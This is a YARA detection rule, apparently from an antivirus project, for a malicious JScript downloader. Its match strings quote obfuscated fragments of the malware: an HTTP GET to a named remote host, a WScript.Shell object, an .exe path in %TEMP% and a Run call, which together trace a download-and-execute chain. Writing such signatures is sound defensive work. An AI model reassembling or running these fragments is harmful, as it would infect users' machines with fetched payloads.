rule sig_20160401_f9037e908ffb159c839e98798440bba2 {
  meta:
    description = "datamaliciousorder - file 20160401_f9037e908ffb159c839e98798440bba2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a2d8180a709953ad8fefcba879ac61681bebd43214c05c2bab03f06653c77d86"

  strings:
    $s1  = "function HmmLtj(HiIqf, TmpZk){CtfWz = CtfWz * 1; return HiIqf - TmpZk;};" fullword ascii
    $s2  = "QdBh[LsmFsc](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s3  = "var PoWpi = function JiSf() {return WScript[ZkjZl](\"WScript\"+\".Shell\");}(), VlEie = 11;" fullword ascii
    $s4  = "if (QdBh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BhaYs(){return KzsSm + \"\";};" fullword ascii
    $s6  = "function HnxMa() {return PoWpi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"53pBGfAdWhkVkG0.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZjtCw() {return ((UvkAp == true) && (UvkAp == RayFo)) ? 1 : CtfWz;};" fullword ascii
    $s8  = "var RtDv = new this[\"Date\"]();" fullword ascii
    $s9  = "return HmmLtj(YcJz, HrvKw);" fullword ascii
    $s10 = "function HuWp(LhCvr){PoWpi[\"R\"+\"un\"](LhCvr, CtfWz, CtfWz);};" fullword ascii
    $s11 = "function KkEez(){return 23;};" fullword ascii
    $s12 = "function HcrKe(OuiBnq) {var KwtFc = (1, 2, 3, 4, 5, OuiBnq); return KwtFc;};" fullword ascii
    $s13 = "function JwEqc(){return ZkjZl;};" fullword ascii
    $s14 = "var RayFo = false;" fullword ascii
    $s15 = "UvkAp = true; " fullword ascii
    $s16 = "RayFo = true; " fullword ascii
    $s17 = "var JyRa = false;" fullword ascii
    $s18 = "function QalTuu()" fullword ascii
    $s19 = "}while (FgPj);" fullword ascii
    $s20 = "var UvkAp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}